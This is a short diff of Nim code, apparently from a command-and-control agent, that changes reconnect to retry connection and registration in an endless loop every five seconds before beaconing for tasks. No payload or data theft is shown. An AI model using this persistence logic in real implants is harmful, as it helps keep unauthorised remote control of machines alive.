@@ -119,9 +119,11 @@ proc register*(t: var AgentTransport): bool =
   t.doRegister()
 
 proc reconnect(t: var AgentTransport) =
-  try: t.sock.close() except: discard
-  t.doConnect()
-  discard t.doRegister()
+  while true:
+    try: t.sock.close() except: discard
+    t.doConnect()
+    if t.doRegister(): return
+    Sleep(5000)
 
 proc beacon*(t: var AgentTransport): seq[TaskWire] =
   try:
